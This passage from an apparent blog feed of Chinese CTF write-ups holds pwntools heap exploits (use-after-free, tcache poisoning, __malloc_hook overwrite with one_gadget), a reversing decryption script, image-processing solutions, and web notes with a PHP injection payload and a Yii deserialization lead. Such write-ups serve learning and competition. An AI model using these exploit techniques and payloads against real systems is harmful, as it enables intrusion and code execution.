class="string">'__malloc_hook'</span>]</span><br><span class="line">    onegadget = [<span class="number">0x4f3d5</span>, <span class="number">0x4f432</span>,<span class="number">0x10a41c</span>]<span class="comment">#</span></span><br><span class="line">    onegadget = libc_addr + onegad[<span class="number">1</span>]</span><br><span class="line">    realloc = libc_addr + libc.sym[<span class="string">'realloc'</span>]</span><br><span class="line">    realloc_hook = libc_addr + libc.sym[<span class="string">'__realloc_hook'</span>]</span><br><span class="line">    read(<span class="number">1</span>, <span class="number">0xfffffffffffffff5</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'Result: '</span>)</span><br><span class="line">    text_addr = int(r.recvuntil(<span class="string">'\n'</span>, drop=<span class="number">1</span>), <span class="number">16</span>) - <span class="number">0x202008</span></span><br><span class="line">    array_addr = text_addr + <span class="number">0x202060</span></span><br><span class="line">    success(<span class="string">"text_addr: 0x%x"</span>%(text_addr))</span><br><span class="line">    off = (realloc_hook - array_addr)/<span class="number">8</span></span><br><span class="line">    all_in(off, p64(onegadget), <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    off = (malloc_hook - array_addr)/<span class="number">8</span></span><br><span class="line">    all_in(off , p64(realloc+<span class="number">2</span>), <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    r.sendline(<span class="string">'1'</span>*<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                r = remote(<span class="string">'123.60.211.115'</span>, <span class="number">23074</span>)</span><br><span class="line">                pwn()</span><br><span class="line">                r.interactive()</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                r.close()</span><br></pre></td></tr></table></figure><h3 id="lonelywolf"><a href="#lonelywolf" class="headerlink" title="lonelywolf"></a>lonelywolf</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'1'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Index: '</span>, <span class="string">'0'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Size: '</span>,str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(cont)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'2'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Index: '</span>, <span class="string">'0'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Content: '</span>,str(cont))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">()</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'choice: '</span>, <span class="string">'4'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Index: '</span>, <span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'choice: '</span>, <span class="string">'3'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Index: '</span>, <span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">confirm</span><span class="params">(name,addr)</span>:</span></span><br><span class="line">    log.success(<span class="string">'The '</span>+str(name)+<span class="string">' Addr=====&gt; '</span> + str(hex(addr)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main_arena = <span class="number">0x3ebc40</span></span><br><span class="line">elf=ELF(<span class="string">'./lonelywolf'</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#UAF</span></span><br><span class="line">    add(<span class="number">8</span>)</span><br><span class="line">    delete()</span><br><span class="line">    edit(<span class="string">'A'</span>*<span class="number">7</span> + <span class="string">'B'</span>)</span><br><span class="line">    show()</span><br><span class="line">    r.recvuntil(<span class="string">'B'</span>)</span><br><span class="line">    heap_base = u64(r.recvuntil(<span class="string">'\n'</span>, drop=<span class="number">1</span>, timeout=<span class="number">1</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x10</span></span><br><span class="line">    key = heap_base + <span class="number">0x10</span></span><br><span class="line">    edit(p64(<span class="number">0</span>))</span><br><span class="line">    add(<span class="number">0x10</span>)</span><br><span class="line">    delete()</span><br><span class="line">    edit(p64(heap_base+<span class="number">0x10</span>) +  p64(key))</span><br><span class="line">    add(<span class="number">0x10</span>)</span><br><span class="line">    add(<span class="number">2</span>)</span><br><span class="line">    edit(p8(<span class="number">0</span>)+p8(<span class="number">0x7</span>))</span><br><span class="line">    add(<span class="number">0x20</span>)</span><br><span class="line">    delete()</span><br><span class="line">    add(<span class="number">0x30</span>)</span><br><span class="line">    r.sendline(<span class="string">'1'</span>*<span class="number">0x500</span>)</span><br><span class="line">    add(<span class="number">0x20</span>)</span><br><span class="line">    show()</span><br><span class="line">    r.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">    libc_addr = u64(r.recvuntil(<span class="string">'\n'</span>, drop=<span class="number">1</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x80</span> -main_arena</span><br><span class="line">    malloc_hook = libc_addr + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">    realloc_hook = libc_addr + libc.sym[<span class="string">'__realloc_hook'</span>]</span><br><span class="line">    realloc = libc_addr + libc.sym[<span class="string">'realloc'</span>]</span><br><span class="line">    onegad = [<span class="number">0x4f3d5</span>, <span class="number">0x4f432</span>,<span class="number">0x10a41c</span>]</span><br><span class="line">    onegadget = libc_addr + onegad[<span class="number">2</span>]</span><br><span class="line">    confirm(<span class="string">'malloc_hook'</span>, malloc_hook)</span><br><span class="line">    confirm(<span class="string">'onegadget'</span>, onegadget)</span><br><span class="line">    add(<span class="number">0x30</span>)</span><br><span class="line">    delete()</span><br><span class="line">    edit(p64(malloc_hook)+ p64(key))</span><br><span class="line">    add(<span class="number">0x30</span>)</span><br><span class="line">    add(<span class="number">0x30</span>)</span><br><span class="line">    edit(p64(onegadget))</span><br><span class="line">    add(<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    r = remote(<span class="string">'123.60.211.115'</span>,<span class="number">22997</span>)</span><br><span class="line">    pwn()</span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="glass"><a href="#glass" class="headerlink" title="glass"></a>glass</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">flag = [</span><br><span class="line">        <span class="number">0xA3</span>, <span class="number">0x1A</span>, <span class="number">0xE3</span>, <span class="number">0x69</span>, <span class="number">0x2F</span>, <span class="number">0xBB</span>, <span class="number">0x1A</span>, <span class="number">0x84</span>, <span class="number">0x65</span>, <span class="number">0xC2</span>, </span><br><span class="line">        <span class="number">0xAD</span>, <span class="number">0xAD</span>, <span class="number">0x9E</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x02</span>, <span class="number">0x1F</span>, <span class="number">0x8E</span>, <span class="number">0x36</span>, <span class="number">0x4F</span>, </span><br><span class="line">        <span class="number">0xE1</span>, <span class="number">0xEB</span>, <span class="number">0xAF</span>, <span class="number">0xF0</span>, <span class="number">0xEA</span>, <span class="number">0xC4</span>, <span class="number">0xA8</span>, <span class="number">0x2D</span>, <span class="number">0x42</span>, <span class="number">0xC7</span>, </span><br><span class="line">        <span class="number">0x6E</span>, <span class="number">0x3F</span>, <span class="number">0xB0</span>, <span class="number">0xD3</span>, <span class="number">0xCC</span>, <span class="number">0x78</span>, <span class="number">0xF9</span>, <span class="number">0x98</span>, <span class="number">0x3F</span></span><br><span class="line">]</span><br><span class="line">password = <span class="string">'12345678'</span></span><br><span class="line"></span><br><span class="line">tmp_1 = [i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>)]</span><br><span class="line">tmp_2 = [password[i%<span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>)]</span><br><span class="line"></span><br><span class="line">v9 = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    v10 = tmp_1[i]</span><br><span class="line">    v9 = (v9 + v10 + ord(tmp_2[i])) % <span class="number">256</span></span><br><span class="line">    tmp_1[i] = tmp_1[v9]</span><br><span class="line">    tmp_1[v9] = v10</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">39</span>):</span><br><span class="line">    flag[i] ^= ord(password[i%<span class="number">8</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">38</span>,<span class="number">0</span>,<span class="number">-3</span>):</span><br><span class="line">    flag[i<span class="number">-1</span>] ^= flag[i<span class="number">-2</span>]</span><br><span class="line">    flag[i] ^= flag[i<span class="number">-1</span>]</span><br><span class="line">    flag[i<span class="number">-2</span>] ^= flag[i]</span><br><span class="line"></span><br><span class="line">v3 = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">38</span>):</span><br><span class="line">    v5 = tmp_1[i+<span class="number">1</span>]</span><br><span class="line">    v3 = (v3+v5)%<span class="number">256</span></span><br><span class="line">    tmp_1[i+<span class="number">1</span>] = tmp_1[v3]</span><br><span class="line">    tmp_1[v3] = v5</span><br><span class="line">    flag[i] ^= tmp_1[(v5+tmp_1[i+<span class="number">1</span>])%<span class="number">256</span>]</span><br><span class="line"></span><br><span class="line">print(<span class="string">''</span>.join([chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> flag]))</span><br></pre></td></tr></table></figure><h2 id="Web-请点击跳转"><a href="#Web-请点击跳转" class="headerlink" title="Web(请点击跳转)"></a>Web(请点击跳转)</h2>]]></content>
    
    <summary type="html">
    
      
      
        
        
          
        
      
    
    </summary>
    
    
      <category term="Writeup" scheme="http://xibai.xyz/categories/Writeup/"/>
    
    
      <category term="CTF" scheme="http://xibai.xyz/tags/CTF/"/>
    
      <category term="Writeup" scheme="http://xibai.xyz/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>2021-Radhat</title>
    <link href="http://xibai.xyz/2020/05/08/2021redhat/"/>
    <id>http://xibai.xyz/2020/05/08/2021redhat/</id>
    <published>2020-05-08T15:51:11.000Z</published>
    <updated>2021-05-16T05:42:19.762Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>题目名：EBCDIC。EBCDIC编码打开即可看到flag</p><h3 id="colorful-code"><a href="#colorful-code" class="headerlink" title="colorful code"></a>colorful code</h3><p>题目名colorful code，文件data2里面总共0x300字节的数据，仔细查看发现除了前六十字节，后面的字节全是每三个字节一组<br>很明显，data2应该是像素值，而且可能只有前20组有用；</p><p>data1里面全是数字，统计一下发现只有0-19，很明显，就是对应data2前20组像素值，脚本转一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">color = [(<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>),(<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xc0</span>),(<span class="number">0x00</span>,<span class="number">0xff</span>,<span class="number">0xff</span>),(<span class="number">0x00</span>,<span class="number">0xff</span>,<span class="number">0x00</span>),(<span class="number">0xff</span>,<span class="number">0xc0</span>,<span class="number">0xff</span>),(<span class="number">0xff</span>,<span class="number">0xc0</span>,<span class="number">0xc0</span>),(<span class="number">0xc0</span>,<span class="number">0xc0</span>,<span class="number">0xff</span>),(<span class="number">0xc0</span>,<span class="number">0xc0</span>,<span class="number">0x00</span>),(<span class="number">0xff</span>,<span class="number">0x00</span>,<span class="number">0xff</span>),(<span class="number">0xff</span>,<span class="number">0x00</span>,<span class="number">0x00</span>),(<span class="number">0xc0</span>,<span class="number">0x00</span>,<span class="number">0x00</span>),(<span class="number">0xc0</span>,<span class="number">0x00</span>,<span class="number">0xc0</span>),(<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xff</span>),(<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0x00</span>),(<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xc0</span>),(<span class="number">0x00</span>,<span class="number">0xc0</span>,<span class="number">0x00</span>),(<span class="number">0x00</span>,<span class="number">0xc0</span>,<span class="number">0xc0</span>),(<span class="number">0xc0</span>,<span class="number">0xff</span>,<span class="number">0xff</span>),(<span class="number">0xc0</span>,<span class="number">0xff</span>,<span class="number">0xc0</span>),(<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xff</span>)]</span><br><span class="line">print(len(color))</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'data1'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    img = Image.new(<span class="string">'RGB'</span>,(<span class="number">37</span>,<span class="number">191</span>),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">    tmp = f.read(<span class="number">1</span>)</span><br><span class="line">    flag = [] ; tmp_str = <span class="string">''</span></span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> tmp != <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">if</span> tmp != <span class="string">' '</span>:</span><br><span class="line">            tmp_str += tmp</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> int(tmp_str,<span class="number">10</span>) <span class="keyword">not</span> <span class="keyword">in</span> flag:</span><br><span class="line">                flag.append(int(tmp_str,<span class="number">10</span>))</span><br><span class="line">            pixel = color[int(tmp_str,<span class="number">10</span>)]</span><br><span class="line">            img.putpixel((num // <span class="number">191</span> ,num % <span class="number">191</span>),pixel)</span><br><span class="line">            tmp_str = <span class="string">''</span></span><br><span class="line">            num += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        tmp = f.read(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    img.save(<span class="string">'flag.png'</span>)</span><br></pre></td></tr></table></figure><p>得到一张图片，图片的样子加上题目名可以想到是 npiet 语言，用 npiet 解一下图片就可以了</p><h3 id="PicPic"><a href="#PicPic" class="headerlink" title="PicPic"></a>PicPic</h3><h4 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h4><p>这里第一关看出题人给的脚本可以知道，出题人把原视频切割成帧图像之后，对每帧画面进行了傅里叶变换的处理，然后分别保存幅度图和相位图，其中幅度图的最大最小值都写在文件 r 里。</p><p>这里做题的时候暂时没想明白一点是：根据出题人的脚本可知，原视频切割了多少帧，for循环就执行多少次，相应的r文件中的数据也就被写入多少次，计算可知r文件被写入80次，也就是源png应该是80个，这里因为合并的时候出题人设置每秒25帧，所以合并后的视频是200帧，这种情况下，忽略了这一点反而也能解出正确图像是没想到的，暂时不理解为什么可以解出。这不逻辑</p><p>总之写出脚本对出题人输出的mkv进行反向操作可以得到源视频切割后的图像，能够在图像中看到下一关的压缩密码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mapping</span><span class="params">(data, down=<span class="number">0</span>, up=<span class="number">255</span>, tp=np.uint8)</span>:</span></span><br><span class="line">    data_max = data.max()</span><br><span class="line">    data_min = data.min()</span><br><span class="line">    interval = data_max - data_min</span><br><span class="line">    new_interval = up - down</span><br><span class="line">    new_data = (data - data_min) * new_interval / interval + down</span><br><span class="line">    new_data = new_data.astype(tp)</span><br><span class="line">    <span class="keyword">return</span> new_data</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'r'</span>,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    files = os.listdir(<span class="string">'m'</span>)</span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">        m = cv2.imread(<span class="string">f'm/<span class="subst">&#123;file&#125;</span>'</span>,cv2.IMREAD_GRAYSCALE)</span><br><span class="line">        p = cv2.imread(<span class="string">f'p/<span class="subst">&#123;file&#125;</span>'</span>,cv2.IMREAD_GRAYSCALE)</span><br><span class="line">        r = struct.unpack(<span class="string">'!ff'</span>,f.read(<span class="number">8</span>))</span><br><span class="line">        Min = float(r[<span class="number">0</span>])</span><br><span class="line">        Max = float(r[<span class="number">1</span>])</span><br><span class="line">        </span><br><span class="line">        m = mapping(m,Min,Max,np.float64)</span><br><span class="line">        p = mapping(p,-np.pi, np.pi,np.float64)</span><br><span class="line">        m = np.exp(m)</span><br><span class="line"></span><br><span class="line">        img = (m*np.cos(p)) + (m * np.sin(p) * <span class="number">1j</span>)</span><br><span class="line">        img = np.fft.ifftshift(img)</span><br><span class="line">        img = np.fft.ifft2(img)</span><br><span class="line">        img = mapping(img)</span><br><span class="line"></span><br><span class="line">        cv2.imwrite(<span class="string">f'frame/<span class="subst">&#123;file&#125;</span>'</span>,img)</span><br></pre></td></tr></table></figure><h4 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h4><p>给了一个hint，里面是mathML语言，直接html解析一下得到一个数学表达式，结合傅里叶变换可知是提示图像相位互换。脚本：</p><p>得到原二维码，扫码得到一串不明十六进制，猜测密文，先去下一关</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fft</span><span class="params">(img)</span>:</span></span><br><span class="line">    fft = np.fft.fft2(img)</span><br><span class="line">    m = np.abs(fft)</span><br><span class="line">    p = np.angle(fft)</span><br><span class="line">    <span class="keyword">return</span> m, p</span><br><span class="line"></span><br><span class="line">img1 = cv2.imread(<span class="string">'mix1.png'</span>, cv2.IMREAD_GRAYSCALE)</span><br><span class="line">img2 = cv2.imread(<span class="string">'mix2.png'</span>, cv2.IMREAD_GRAYSCALE)</span><br><span class="line"></span><br><span class="line">m1,p1 = fft(img1)</span><br><span class="line">m2,p2 = fft(img2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># exchange phase</span></span><br><span class="line">m1_p2 = m1*np.cos(p2) + m1*np.sin(p2)*<span class="number">1j</span></span><br><span class="line">m2_p1 = m2*np.cos(p1) + m2*np.sin(p1)*<span class="number">1j</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m1_p2 = np.fft.ifft2(m1_p2)</span><br><span class="line">cv2.imwrite(<span class="string">'test1.png'</span>,np.uint8(m1_p2))</span><br><span class="line">m2_p1 = np.fft.ifft2(m2_p1)</span><br><span class="line">cv2.imwrite(<span class="string">'test2.png'</span>,np.uint8(m2_p1))</span><br><span class="line"></span><br><span class="line">img = Image.open(<span class="string">'123.png'</span>)</span><br><span class="line">x,y = img.size</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(y):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(x):</span><br><span class="line">        pixel = img.getpixel((i,j))</span><br><span class="line">        <span class="keyword">if</span> pixel &gt;= <span class="number">230</span>:</span><br><span class="line">            img.putpixel((i,j),<span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">img.save(<span class="string">'flag.png'</span>)</span><br><span class="line"></span><br><span class="line">img = Image.open(<span class="string">'flag.png'</span>)</span><br><span class="line">x,y = img.size</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(y):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(x):</span><br><span class="line">        pixel = img.getpixel((i,j))</span><br><span class="line">        <span class="keyword">if</span> pixel &gt;= <span class="number">50</span>:</span><br><span class="line">            img.putpixel((i,j),<span class="number">255</span>)</span><br><span class="line"></span><br><span class="line">img.save(<span class="string">'flag.png'</span>)</span><br></pre></td></tr></table></figure><h4 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h4><p>一张看上去满是噪点的图片，结合本题前两关可知，这应该是频谱图，考虑到幅度图还原不了原图，所以应该是相位图还原原图。脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mapping</span><span class="params">(data, down=<span class="number">0</span>, up=<span class="number">255</span>, tp=np.uint8)</span>:</span></span><br><span class="line">    data_max = data.max()</span><br><span class="line">    data_min = data.min()</span><br><span class="line">    interval = data_max - data_min</span><br><span class="line">    new_interval = up - down</span><br><span class="line">    new_data = (data - data_min) * new_interval / interval + down</span><br><span class="line">    new_data = new_data.astype(tp)</span><br><span class="line">    <span class="keyword">return</span> new_data</span><br><span class="line"></span><br><span class="line">img = cv2.imread(<span class="string">'phase.png'</span>, cv2.IMREAD_UNCHANGED)</span><br><span class="line"></span><br><span class="line">img = mapping(img,-np.pi,np.pi)</span><br><span class="line">img = np.exp(<span class="number">1j</span>*img)</span><br><span class="line">img = np.fft.ifftshift(img)</span><br><span class="line">img = np.fft.ifft2(img)</span><br><span class="line">img = np.abs(img)</span><br><span class="line">img = mapping(img)</span><br><span class="line"></span><br><span class="line">cv2.imwrite(<span class="string">'test.png'</span>,img.astype(np.uint8))</span><br><span class="line"></span><br><span class="line">img = Image.open(<span class="string">'test.png'</span>)</span><br><span class="line">x,y = img.size</span><br><span class="line">test_img = Image.new(<span class="string">'L'</span>,(x,y))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(x):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(y):</span><br><span class="line">        pixel = img.getpixel((i,j))</span><br><span class="line">        <span class="keyword">if</span> pixel &lt; <span class="number">2</span>:</span><br><span class="line">            test_img.putpixel((i,j),<span class="number">255</span>)</span><br><span class="line"></span><br><span class="line">test_img.save(<span class="string">"key.png"</span>)</span><br></pre></td></tr></table></figure><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="find-it"><a href="#find-it" class="headerlink" title="find_it"></a>find_it</h3><p>robots.txt 提示1ndexx.php<br>.1ndexx.php.swp拿到源码 ?code=<?=phpinfo();?><br> hack.php中搜索flag，找到flag</p><h3 id="framework"><a href="#framework" class="headerlink" title="framework"></a>framework</h3><p><a href="http://www.zip" target="_blank" rel="noopener">www.zip</a> 下载源码，本地搭环境查看版本是yii 2.0.38<br>审计发现actionAbout存在反序列化，网上搜索找到链子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 